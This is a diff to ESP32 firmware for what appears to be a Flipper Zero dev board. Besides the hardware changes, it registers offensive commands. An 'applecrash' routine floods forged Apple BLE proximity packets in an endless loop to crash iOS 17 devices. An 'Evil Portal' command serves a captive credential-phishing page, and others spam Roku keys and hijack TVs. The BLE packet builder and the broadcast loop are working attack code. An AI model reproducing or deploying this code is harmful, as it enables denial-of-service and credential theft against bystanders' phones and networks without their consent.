@@ -10,54 +10,58 @@
 
 #include "Dial.h"
 
-flipperLED led;
+
 EvilPortal Portal;
 
-//#define DEVBOARDPRO
-#define DEVBOARD
+#define DEVBOARDPRO
+//#define DEVBOARD
+
 
 #ifdef DEVBOARD
 #define SD_PIN 10
+flipperLED led;
 #endif
 
 #ifdef DEVBOARDPRO
 #define SD_PIN 4
-#define SUPPORTS_BLE true
+#define SUPPORTS_BLE
+#define NEOPIXEL
 #endif
 
 #ifdef SUPPORTS_BLE
 #include <NimBLEDevice.h>
-#include <NimBLEUtils.h>
-#include <NimBLEServer.h>
+NimBLEAdvertising *pAdvertising;
+#endif
+
+#ifdef NEOPIXEL
+#include "Neopixel.h"
+LedInterface led;
 #endif
 
 #ifdef SUPPORTS_BLE
-BLEAdvertisementData getOAdvertisementData() {
-  BLEAdvertisementData randomAdvertisementData = BLEAdvertisementData();
+NimBLEAdvertisementData getOAdvertisementData() {
+  NimBLEAdvertisementData randomAdvertisementData = NimBLEAdvertisementData();
   uint8_t packet[17];
   uint8_t size = 17;
   uint8_t i = 0;
 
-  packet[i++] = size - 1;  // Packet Length
-  packet[i++] = 0xFF;      // Packet Type (Manufacturer Specific)
-  packet[i++] = 0x4C;      // Packet Company ID (Apple, Inc.)
-  packet[i++] = 0x00;      // ...
-  packet[i++] = 0x0F;      // Type
-  packet[i++] = 0x05;      // Length
-  packet[i++] = 0xC1;      // Action Flags
+  packet[i++] = size - 1;    // Packet Length
+  packet[i++] = 0xFF;        // Packet Type (Manufacturer Specific)
+  packet[i++] = 0x4C;        // Packet Company ID (Apple, Inc.)
+  packet[i++] = 0x00;        // ...
+  packet[i++] = 0x0F;  // Type
+  packet[i++] = 0x05;                        // Length
+  packet[i++] = 0xC1;                        // Action Flags
   const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
   packet[i++] = types[rand() % sizeof(types)];  // Action Type
-  packet[i++] = rand() % 256;
-  packet[i++] = rand() % 256;
-  packet[i++] = rand() % 256;  // Authentication Tag
-  packet[i++] = 0x00;          // ???
-  packet[i++] = 0x00;          // ???
-  packet[i++] = 0x10;          // Type ???
-  packet[i++] = rand() % 256;
-  packet[i++] = rand() % 256;
-  packet[i++] = rand() % 256;
+  esp_fill_random(&packet[i], 3); // Authentication Tag
+  i += 3;   
+  packet[i++] = 0x00;  // ???
+  packet[i++] = 0x00;  // ???
+  packet[i++] =  0x10;  // Type ???
+  esp_fill_random(&packet[i], 3);
 
-  randomAdvertisementData.addData(std::string((char*)packet, 17));
+  randomAdvertisementData.addData(std::string((char *)packet, 17));
   return randomAdvertisementData;
 }
 #endif
@@ -119,21 +123,21 @@ void RokuKeySpam(const char* SSID, const char* Password) {
   delete dial;
 }
 
-void AppleCrash() {
+void AppleCrash(const char* UnusedParameter) {
 #ifdef SUPPORTS_BLE
 
-  BLEDevice::init("");
+  NimBLEDevice::init("");
 
-  BLEServer* pServer = BLEDevice::createServer();
+  NimBLEServer *pServer = NimBLEDevice::createServer();
 
-  BLEAdvertising* pAdvertising = pServer->getAdvertising();
-  pAdvertising->setAdvertisementType(4);
+  pAdvertising = pServer->getAdvertising();
 
   while (true) {
     delay(45);
-    BLEAdvertisementData advertisementData = getOAdvertisementData();
+    NimBLEAdvertisementData advertisementData = getOAdvertisementData();
     pAdvertising->setAdvertisementData(advertisementData);
     pAdvertising->start();
+    Serial.println("Sending Packet");
     delay(20);
     pAdvertising->stop();
     delay(2000); // 2 second delay TODO make this a parameter
@@ -239,12 +243,12 @@ Command<const char*, const char*, const char*> cmd5("RokuConnect", "Connect to R
 Command<const char*, const char*> cmd6("RokuKeySpam", "More Annoying than Anything. (Args <SSID> <PASSWORD>", RokuKeySpam);
 Command<const char*, const char*> cmd7("RunNEP", "Native Evil Portal Args <Directory of HTML FILE> <SSID>", RunNEP);
 Command<const char*> cmd8("update", "Update ESP32 to a new Bin", UpdateESP);
-Command<> cmd9("applecrash", "Crash Apple Devices on IOS 17 Credit to WillyJL and ECTO-1A.", AppleCrash);
+Command<const char*> cmd9("applecrash", "Crash Apple Devices on IOS 17 Credit to WillyJL and ECTO-1A.", AppleCrash);
 Command<const char*, const char*, const char*> cmd1("YTVConnect", "Connect to YouTube. Usage: YTConnect <ID> <SSID> <Password>", YTConnect);
 Command<const char*, const char*> cmd2("RickRollTV", "Rickroll a TV. Usage: RickRollTV <SSID> <Password>", RickRollTV);
 Command<const char*, const char*, const char*> cmd3("ChromeConnectEZYT", "Connect to Youtube Easily Usage: YTChromeConnectEasy <SSID> <Password> <ID>", YTChromeConnectEasy);
-const int numCommands = 7;
-CommandBase* commands[MAX_COMMANDS] = { &cmd1, &cmd2, &cmd3, &cmd4, &cmd5, &cmd6, &cmd7 };
+const int numCommands = 9;
+CommandBase* commands[MAX_COMMANDS] = { &cmd1, &cmd2, &cmd3, &cmd4, &cmd5, &cmd6, &cmd7, &cmd8, &cmd9};
 CommandLine commandli(commands, numCommands);
 
 void loop() {
@@ -256,6 +260,9 @@ void LoopTask(void* parameter) {
   while (true) {
     if (ShouldMultithread) {
       Portal.loop(commandli);
+      #ifdef NEOPIXEL
+      led.main(millis());
+      #endif
     }
     vTaskDelay(1000 / portTICK_PERIOD_MS);  // Run every second
   }
@@ -278,6 +285,10 @@ void setup() {
 
 #ifdef DEVBOARD
   led.RunSetup();
+#endif
+
+#ifdef NEOPIXEL
+led.RunSetup();
 #endif
 
   xTaskCreatePinnedToCore(LoopTask, "LoopTask", 20000, NULL, 1, NULL, 1);
